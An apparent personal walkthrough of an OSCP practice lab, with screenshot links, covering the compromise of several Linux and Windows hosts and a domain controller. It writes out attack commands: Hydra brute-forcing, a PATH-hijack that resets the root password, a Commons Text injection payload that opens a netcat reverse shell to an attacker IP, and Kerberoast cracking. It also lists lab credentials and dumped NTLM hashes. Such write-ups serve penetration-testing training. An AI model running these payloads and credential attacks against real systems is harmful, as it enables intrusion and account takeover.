# OSCP B

## Network

**Given:**

- 192.168.145.147 MS01
- 192.168.145.149
- 192.168.145.150
- 192.168.145.151

**Found:**

- 10.10.105.146 DC01
- 10.10.105.148 MS02

## Creds

```
eric.wallows:EricLikesRunning800 (given creds for 192.168.145.147)
web_svc:Diamond1
sql_svc:Dolphin1
Administrator:December31 (local admin on MS01)

other users:
```

## Network Enumeration

![](assets/Pasted%20image%2020250216235141.png)

## 192.168.145.149

### Enumeration

![](assets/Pasted%20image%2020250216235211.png)

Performing a UDP scan reveals SNMP.

![](assets/Pasted%20image%2020250217011643.png)

### Initial Access

Scanning it with `snmpwalk` extended.

![](assets/Pasted%20image%2020250217011708.png)

We discover the user `kiero` with a default password. We'll use Hydra with the `-e nsr` option to try the same password as the username, null, or reversed.

```bash
hydra ftp://192.168.188.149 -l kiero -P /usr/share/wordlists/rockyou.txt.gz -e nsr
```

![](assets/Pasted%20image%2020250217012140.png)

And we get `kiero:kiero`.

Testing FTP access:

![](assets/Pasted%20image%2020250217012252.png)

Download the keys and inspect them.

![](assets/Pasted%20image%2020250217013340.png)

The public key mentions the user `john`, so we'll try SSH.

![](assets/Pasted%20image%2020250217013444.png)

### Privilege Escalation

Get the local flag.

![](assets/Pasted%20image%2020250217013539.png)

![](assets/Pasted%20image%2020250217121252.png)

`RESET_PASSWD` has the SUID bit set. Download the program and analyze it with `strings`.

We observe that it calls `chpasswd` without an absolute path.

![](assets/Pasted%20image%2020250217121404.png)

This allows us to hijack the PATH and create a malicious program with the same name in `/tmp`. Add `/tmp` to the PATH.

Create a simple script in `/tmp/chpasswd` and make it executable:

```bash
echo 'echo "root:kiero" | /usr/sbin/chpasswd'
```

Prepend `/tmp` to John's PATH and execute `RESET_PASSWD`:

```bash
export PATH=/tmp:$PATH
```

![](assets/Pasted%20image%2020250217131950.png)

### Post Exploitation

![](assets/Pasted%20image%2020250217131500.png)

## 192.168.145.150

### Enumeration

![](assets/Pasted%20image%2020250217220330.png)

A webpage on port 8080 shows that there is an API running.

![](assets/Pasted%20image%2020250217220452.png)

Using `feroxbuster`, we find `/search` and `/CHANGELOG`.

![](assets/Pasted%20image%2020250218132246.png)

### Initial Access

![](assets/Pasted%20image%2020250218132311.png)

Searching for vulnerabilities in Apache Commons Text 1.8, we find Text4Logs.

https://github.com/sunnyvale-it/CVE-2022-42889-PoC

Executing `${script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc 192.168.45.229 443 -e sh')}` in the search function gives us a shell. (URL encoded with CyberChef)

![](assets/Pasted%20image%2020250218132521.png)

![](assets/Pasted%20image%2020250218132546.png)

### Privilege Escalation

Get the flag

![](assets/Pasted%20image%2020250218132813.png)

In `/opt`, we find the project and an `App.java` file. This app opens a socket on port 5000.

![](assets/Pasted%20image%2020250219102300.png)

Using `ss`, we see an internal port 8000.

![](assets/Pasted%20image%2020250219110044.png)

Using `ps aux`, we observe that the port is for Java debugging.

![](assets/Pasted%20image%2020250219110452.png)

Transfer `chisel` and create a tunnel to access the port.

![](assets/Pasted%20image%2020250219110302.png)

We use `jdwp-shellifier` https://github.com/IOActive/jdwp-shellifier.

![](assets/Pasted%20image%2020250219113803.png)

In the command, we set the SUID bit to make `/bin/bash` executable by root. While the debugger waits for the program to execute, we use `nc` to port 5000 to reach the breakpoint.

![](assets/Pasted%20image%2020250219113915.png)

Then, we check with the `dev` user.

![](assets/Pasted%20image%2020250219114007.png)

### Post Exploitation

![](assets/Pasted%20image%2020250219114043.png)

## 192.168.145.151

### Enumeration

![](assets/Pasted%20image%2020250220235427.png)

### Initial Access

The HTTP server has nothing. Let's search for an exploit for port 8021, `freeswitch-event`.

![](assets/Pasted%20image%2020250219125219.png)

![](assets/Pasted%20image%2020250219125235.png)

We can use a PowerShell reverse shell.

![](assets/Pasted%20image%2020250219125500.png)

And we get a shell.

![](assets/Pasted%20image%2020250219125519.png)

### Privilege Escalation

Get the local flag

![](assets/Pasted%20image%2020250219125604.png)

Chris has `SeImpersonatePrivilege`.

![](assets/Pasted%20image%2020250219125713.png)

Transfer `juicypotato-ng` to the machine, create a reverse shell with `msfvenom`, and listen on port 8888.

![](assets/Pasted%20image%2020250219133859.png)

### Post Exploitation

![](assets/Pasted%20image%2020250219133956.png)

## 192.168.145.147

### Enumeration

![](assets/Pasted%20image%2020250219134541.png)

### Initial Access

Use the provided credentials to SSH into the machine.

### Privilege Escalation

Transfer `adPEAS`.

![](assets/Pasted%20image%2020250219235957.png)

![](assets/Pasted%20image%2020250220000022.png)

![](assets/Pasted%20image%2020250220000542.png)

Transfer `chisel`, create a tunnel, and retrieve Kerberoastable user hashes.

![](assets/Pasted%20image%2020250220001918.png)

```bash
hashcat -m 13100 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz --force
```

![](assets/Pasted%20image%2020250220002053.png)

We get `web_svc:Diamond1` and `sql_svc:Dolphin1`.

User `eric` has `SeImpersonatePrivilege`, so we transfer `printerspoofer`.

![](assets/Pasted%20image%2020250220174238.png)

### Post Exploitation

Transfer `mimikatz` to the host.

`sekurlsa::logonpassword`

![](assets/Pasted%20image%2020250220181430.png)

Using `hashcat`.

![](assets/Pasted%20image%2020250220181515.png)

Start an SSH tunnel to scan and work in the internal network.

![](assets/Pasted%20image%2020250220212017.png)

Performing a ping sweep reveals the third machine.

![](assets/Pasted%20image%2020250220004507.png)

## 10.10.105.148

### Enumeration

![](assets/Pasted%20image%2020250220093430.png)

### Initial Access

Using `sql_svc:Dolphin1`, we connect to MSSQL on MS02.

`proxychains -q impacket-mssqlclient 'oscp.exam/sql_svc:Dolphin1@10.10.105.148' -windows-auth`

![](assets/Pasted%20image%2020250220212103.png)

![](assets/Pasted%20image%2020250220220257.png)

### Privilege Escalation

![](assets/Pasted%20image%2020250220220337.png)

In the pivot, transfer `nc.exe`, start a listener, and initiate a PowerShell reverse shell within MSSQL.

![](assets/Pasted%20image%2020250220223306.png)

![](assets/Pasted%20image%2020250220223353.png)

We notice `windows.old`, so we retrieve `SAM` and `SYSTEM`.

Transfer them to the pivot via SMB share.

```bash
mkdir tests
New-SmbShare -Name "tests" -Path "C:\tests" -FullAccess "Everyone"
```

![](assets/Pasted%20image%2020250220224532.png)

Create an SMB share on Kali and copy them again.

![](assets/Pasted%20image%2020250220224613.png)

Using `secretsdump`, we retrieve the hashes for MS02.

![](assets/Pasted%20image%2020250220224641.png)

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
```

## 10.10.105.146 DC

### Enumeration

![](assets/Pasted%20image%2020250220093709.png)

### Initial Access

Using the hash from `tom_admin` obtained in MS02, we use `evil-winrm` to access.

![](assets/Pasted%20image%2020250220225219.png)

### Privilege Escalation

As `tom_admin` is privileged, we perform a DCsync attack to retrieve all the hashes.

![](assets/Pasted%20image%2020250220230713.png)

Use the admin hash to access via `winrm`.

![](assets/Pasted%20image%2020250220230931.png)

### Post Exploitation

Get the proof

![](assets/Pasted%20image%2020250220230917.png)